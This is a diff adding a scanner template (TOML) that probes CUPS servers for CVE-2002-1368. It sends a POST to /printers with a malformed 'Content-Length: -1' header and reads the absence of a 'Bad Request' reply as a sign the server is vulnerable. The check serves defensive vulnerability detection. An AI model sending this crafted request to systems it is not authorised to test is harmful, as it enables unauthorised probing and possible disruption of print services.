@@ -1,0 +1,29 @@
+[info]
+author = "AVE"
+description = "检测目标 CUPS 服务是否存在负长度 HTTP 头远程代码执行漏洞（CVE-2002-1368）。通过发送 Content-Length: -1 的 POST 请求到 /printers 路径，若服务未修复则会挂起等待数据，已修复服务返回 400 错误。"
+id = "POC-AVE-2002-0077"
+name = "CVE-2002-1368 PoC"
+severity = "high"
+tags = ["cve-2002-1368"]
+vuln_id = [
+    "CVE-2002-1368",
+    "AVE-2002-0077",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/printers"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Basic AAA"
+Content-Length = "-1"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = ["Bad Request"]
